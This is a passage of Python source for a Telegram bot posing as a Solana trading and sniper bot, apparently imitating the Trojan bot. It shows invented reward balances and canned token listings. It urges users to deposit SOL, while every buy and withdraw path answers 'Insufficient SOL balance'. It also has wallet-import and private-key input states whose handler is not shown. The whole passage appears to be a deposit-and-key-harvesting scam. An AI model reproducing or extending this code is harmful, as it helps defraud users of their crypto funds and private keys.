        "• Earned rewards: 0 SOL ($0.00)\n\n"
        
        "<b>Cashback Rewards</b>\n"
        "• Earned rewards: 1.62 SOL ($324.56)\n\n"
        
        "<b>Total Rewards</b>\n"
        "• Total paid: 0 SOL ($0.00)\n"
        "• Total unpaid: 1.62 SOL ($324.56)\n\n"
        
        "<b>⚠️ Insufficient SOL balance</b> \n" 
       "• <i>Send at least 0.5 SOL to your wallet, your rewards will automatic claimed to your wallet after your SOL balance enough.</i>\n\n"
        
        f"<b>Your Referral Link</b>\n"
        f"{referral_link}\n"
        "Your friends save 10% with your link.\n\n"
        
        f"Last updated at {now} (every 5 min)"
    )
    
    keyboard = [
        [InlineKeyboardButton("Close", callback_data="back_to_main"),
         InlineKeyboardButton("Update your referral link", callback_data="update_referral_link")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        text=message_text,
        reply_markup=reply_markup,
        parse_mode="HTML",
        disable_web_page_preview=True
    )

async def show_watchlist_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    USER_STATE[query.from_user.id] = "WATCHLIST_MENU"
    
    watchlist = USER_WATCHLISTS.get(query.from_user.id, [])
    
    if not watchlist:
        message_text = (
            "<b>⭐️ Your Watchlist</b>\n\n"
            "You do not have any tokens in your watchlist yet! Add one by clicking the button below."
        )
    else:
        tokens_text = "\n".join([f"• {token}" for token in watchlist])
        message_text = (
            "<b>⭐️ Your Watchlist</b>\n\n"
            f"{tokens_text}"
        )
    
    keyboard = [
        [InlineKeyboardButton("+ Add token", callback_data="add_token")],
        [InlineKeyboardButton("Back", callback_data="back_to_main"),
         InlineKeyboardButton("↻ Refresh", callback_data="refresh_watchlist")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        text=message_text,
        reply_markup=reply_markup,
        parse_mode="HTML"
    )

async def show_buy_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    USER_STATE[user.id] = "AWAITING_TOKEN_ADDRESS"

    message_text = "❌ Insufficient SOL balance"
    keyboard = [[InlineKeyboardButton("Back", callback_data="back_to_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    elif update.message:
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

async def show_trenches_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    USER_STATE[query.from_user.id] = "TRENCHES_MENU"
    
    trenches_text = """🌱 New Pairs | Recently launched tokens.

$ARK | THE ARK — 32s ago
Progress: 0.02%
▰▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
The Ark??
TH: — | DEV: — | H: 8
Vol: $0.2K | MC: $5.5K
(<a href='https://t.me/solana_trojansnipbot?start'>Quick Buy</a>) | (<a href='https://t.me/solana_trojansnipbot?start'>View Chart</a>)

$MOONLIGHT | Moonlight Coin — 25s ago
Progress: 0% | (<a href='https://t.me/solana_trojansnipbot?start'>WEB</a>)
▰▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
Moonlight Coin
TH: — | DEV: — | H: 1
Vol: $0 | MC: $0
(<a href='https://t.me/solana_trojansnipbot?start'>Quick Buy</a>) | (<a href='https://t.me/solana_trojansnipbot?start'>View Chart</a>)

$DOZ | THE DROPZONE — 21s ago
Progress: 86% | (<a href='https://t.me/solana_trojansnipbot?start'>WEB</a>) | (<a href='https://t.me/solana_trojansnipbot?start'>X</a>) | (<a href='https://t.me/solana_trojansnipbot?start'>TG</a>)
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▱▱
THE DROPZONE
TH: — | DEV: — | H: 9
Vol: $10.46K | MC: $41.48K
(<a href='https://t.me/solana_trojansnipbot?start'>Quick Buy</a>) | (<a href='https://t.me/solana_trojansnipbot?start'>View Chart</a>)

$WIGGLY | #wigglypaint — 19s ago
Progress: 0.22% |  (<a href='https://x.com/hashtag/wigglypaint?src=hashtag_click'>X</a>)
▰▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
TH: — | DEV: — | H: 2
Vol: $1.83K | MC: $5.5K
(<a href='https://t.me/solana_trojansnipbot?start'>Quick Buy</a>) | (<a href='https://t.me/solana_trojansnipbot?start'>View Chart</a>)

$MONK | Monkcoin — 7s ago
Progress: 14.5% | (<a href='https://x.com/hashtag/wigglypaint?src=hashtag_click'>X</a>)
▰▰▰▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱
$Monk a member of a die hard community of men typically living under v...
TH: — | DEV: 6.63% | H: 10
Vol: $0.93K | MC: $6.81K
(<a href='https://t.me/solana_trojansnipbot?start'>Quick Buy</a>) | (<a href='https://t.me/solana_trojansnipbot?start'>View Chart</a>)
    """
    keyboard = [
        [InlineKeyboardButton("Back", callback_data="back_to_main"),
         InlineKeyboardButton("↻ Refresh", callback_data="refresh_trenches")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        text=trenches_text,
        reply_markup=reply_markup,
        parse_mode="HTML",
        disable_web_page_preview=True
    )

async def show_copy_trade_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    USER_STATE[query.from_user.id] = "COPY_TRADE_MENU"
    
    user_id = query.from_user.id
    if user_id not in USER_COPY_TRADES:
        USER_COPY_TRADES[user_id] = []
    
    copy_trades = USER_COPY_TRADES[user_id]
    
    if not copy_trades:
        message_text = "<b>Copy Trade Addresses</b>\n\nYou don't have any addresses added yet."
    else:
        message_text = "<b>Copy Trade Addresses</b>\n\n"
        for i, address in enumerate(copy_trades):
            message_text += f"{i+1}. <code>{address}</code>\n"
    
    keyboard = [
        [InlineKeyboardButton("1", callback_data="copy_trade_1"),
         InlineKeyboardButton("2", callback_data="copy_trade_2")],
        [InlineKeyboardButton("+ Add", callback_data="add_copy_trade")],
        [InlineKeyboardButton("Back", callback_data="back_to_main")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        text=message_text,
        reply_markup=reply_markup,
        parse_mode="HTML"
    )

async def add_copy_trade_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    USER_STATE[query.from_user.id] = "AWAITING_COPY_TRADE_ADDRESS"
    
    await query.edit_message_text(
        text="Enter the wallet address you want to copy trades from:",
        parse_mode="HTML"
    )

async def handle_copy_trade_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    wallet_address = update.message.text.strip()
    
    if USER_STATE.get(user.id) != "AWAITING_COPY_TRADE_ADDRESS":
        return
    
    if user.id not in USER_COPY_TRADES:
        USER_COPY_TRADES[user.id] = []
    
    USER_COPY_TRADES[user.id].append(wallet_address)
    
    await update.message.reply_text(
        f"✅ Wallet address added to your copy trade list:\n<code>{wallet_address}</code>",
        parse_mode="HTML"
    )
    
    USER_STATE[user.id] = "COPY_TRADE_MENU"

async def show_sniper_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    USER_STATE[user.id] = "SNIPER_MENU"

    message_text = "<b>Sniper Targets</b>\n\nYou don't have any token addresses added yet."
    keyboard = [
        [InlineKeyboardButton("Add Token Address", callback_data="add_sniper_address")],
        [InlineKeyboardButton("Back", callback_data="back_to_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    elif update.message:
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

async def add_sniper_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    USER_STATE[query.from_user.id] = "AWAITING_SNIPER_ADDRESS"
    
    await query.edit_message_text(
        text="Enter the token contract address you want to snipe:",
        parse_mode="HTML"
    )

async def handle_sniper_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    token_address = update.message.text.strip()
    
    if USER_STATE.get(user.id) != "AWAITING_SNIPER_ADDRESS":
        return
    
    if user.id not in USER_SNIPER_ADDRESSES:
        USER_SNIPER_ADDRESSES[user.id] = []
    
    USER_SNIPER_ADDRESSES[user.id].append(token_address)
    
    await update.message.reply_text(
        f"✅ Token address added to your sniper list:\n<code>{token_address}</code>",
        
        parse_mode="HTML"
    )
    
    USER_STATE[user.id] = "SNIPER_MENU"

async def handle_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    USER_STATE[user.id] = "AWAITING_WITHDRAWAL_ADDRESS"

    message_text = "<b>Withdraw SOL</b>\n\n❌ Insufficient SOL balance to withdraw"
    keyboard = [[InlineKeyboardButton("Back", callback_data="back_to_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    elif update.message:
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

async def handle_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "sell":
        await show_sell_menu(update, context)
    elif query.data == "positions":
        await show_positions_menu(update, context)
    elif query.data == "limit_orders":
        await show_limit_orders_menu(update, context)
    elif query.data == "dca_orders":
        await show_dca_orders_menu(update, context)
    elif query.data == "help":
        await show_help_menu(update, context)
    elif query.data == "settings":
        await show_settings_menu(update, context)
    elif query.data == "back_to_main":
        await start(update, context)
    elif query.data == "refresh_sell":
        await refresh_sell_menu(update, context)
    elif query.data == "refresh_positions":
        await refresh_positions_menu(update, context)
    elif query.data == "refresh_limit_orders":
        await refresh_limit_orders_menu(update, context)
    elif query.data == "refresh_dca_orders":
        await refresh_dca_orders_menu(update, context)
    elif query.data == "refresh":
        await refresh_balance(update, context)
    elif query.data == "wallets":
        await show_wallets_menu(update, context)
    elif query.data == "create_wallet":
        await create_wallet(update, context)
    elif query.data == "import_wallet":
        await import_wallet(update, context)
    elif query.data == "switch_wallet":
        await switch_active_wallet(update, context)
    elif query.data == "view_private_keys":
        await view_private_keys(update, context)
    elif query.data.startswith("activate_"):
        await activate_wallet(update, context)
    elif query.data == "rewards":
        await show_rewards_menu(update, context)
    elif query.data == "update_referral_link":
        await update_referral_link(update, context)
    elif query.data == "watchlist":
        await show_watchlist_menu(update, context)
    elif query.data == "buy":
        await show_buy_menu(update, context)
    elif query.data == "withdraw":
        await handle_withdraw(update, context)
    elif query.data == "trenches":
        await show_trenches_menu(update, context)
    elif query.data == "copy_trade":
        await show_copy_trade_menu(update, context)
    elif query.data == "add_copy_trade":
        await add_copy_trade_address(update, context)
    elif query.data.startswith("copy_trade_"):
        await query.answer(f"Copy trade {query.data.split('_')[-1]} selected", show_alert=True)
    elif query.data == "sniper":
        await show_sniper_menu(update, context)
    elif query.data == "add_sniper_address":
        await add_sniper_address(update, context)
    elif query.data in ["confirm_buy", "cancel_buy", "refresh_after_deposit"]:
        await handle_buy_confirmation(update, context)
    elif query.data == "refresh_watchlist":
        await show_watchlist_menu(update, context)
    elif query.data == "refresh_trenches":
        
        await show_trenches_menu(update, context)
    elif query.data == "toggle_confirm_trades":
        await toggle_setting(update, context, 'confirm_trades')
    elif query.data == "toggle_mev_buys":
        await toggle_setting(update, context, 'mev_buys')
    elif query.data == "toggle_mev_sells":
        await toggle_setting(update, context, 'mev_sells')
    elif query.data == "toggle_auto_buy":
        await toggle_setting(update, context, 'auto_buy')
    elif query.data == "toggle_chart_previews":
        await toggle_setting(update, context, 'chart_previews')
    elif query.data == "toggle_show_tokens":
        await toggle_setting(update, context, 'show_tokens')
    elif query.data == "toggle_auto_sell":
        await toggle_setting(update, context, 'auto_sell')
    elif query.data == "toggle_sell_protection":
        await toggle_setting(update, context, 'sell_protection')
    elif query.data in ["fee_fast", "fee_turbo", "sell_fee_override", 
                       "buy_settings", "sell_settings", "mev_buys", 
                       "mev_sells", "auto_buy", "auto_sell", "bolt_settings", 
                       "simple_mode"]:
        await query.answer("This feature is coming soon!", show_alert=True)
    else:
        await query.edit_message_text(text=f"Action: {query.data}")

async def handle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    command = update.message.text.lower()
    
    if command == '/buy':
        await start_buy_process(update, context)
    elif command == '/sell':
        await show_sell_menu(update, context)
    elif command == '/positions':
        await show_positions_menu(update, context)
    elif command == '/settings':
        await show_settings_menu(update, context)
    elif command == '/snipe':
        await show_sniper_menu(update, context)
    elif command == '/burn':
        await show_limit_orders_menu(update, context)
    elif command == '/withdraw':
        await handle_withdraw(update, context)
    elif command == '/help':
        await show_help_menu(update, context)
    elif command == '/backup':
        await start(update, context)
    else:
        await start(update, context)

async def handle_address_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    state = USER_STATE.get(user_id)

    if state == "AWAITING_PRIVATE_KEY":
        await handle_private_key(update, context)
    elif state == "AWAITING_COPY_TRADE_ADDRESS":
        await handle_copy_trade_address(update, context)
    elif state == "AWAITING_SNIPER_ADDRESS":
        await handle_sniper_address(update, context)
    elif state == "AWAITING_WITHDRAWAL_ADDRESS":
        await handle_withdraw_address(update, context)
    else:
        await update.message.reply_text("❌ Failed, Check again your Contract Address.")

def main():
    app = Application.builder().token(TOKEN).build()

    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("buy", show_buy_menu))
    app.add_handler(CommandHandler("sell", show_sell_menu))
    app.add_handler(CommandHandler("positions", show_positions_menu))
    app.add_handler(CommandHandler("settings", show_settings_menu))
    app.add_handler(CommandHandler("snipe", show_sniper_menu))
    app.add_handler(CommandHandler("burn", show_limit_orders_menu))
    app.add_handler(CommandHandler("withdraw", handle_withdraw))
    app.add_handler(CommandHandler("help", show_help_menu))
    app.add_handler(CommandHandler("backup", start))

    # Callback and message handlers
    app.add_handler(CallbackQueryHandler(handle_button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_address_input))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
